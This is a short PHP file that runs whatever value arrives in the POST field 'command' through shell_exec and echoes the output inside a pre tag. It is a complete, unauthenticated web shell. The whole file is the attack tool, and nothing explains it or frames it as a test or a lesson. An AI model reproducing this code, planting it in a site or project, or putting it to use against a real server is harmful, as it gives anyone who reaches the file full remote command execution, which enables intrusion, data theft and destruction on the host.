<?php

$command = $_POST['command'];

$result = shell_exec($command);

print "<pre>".$result."</pre>";

?>
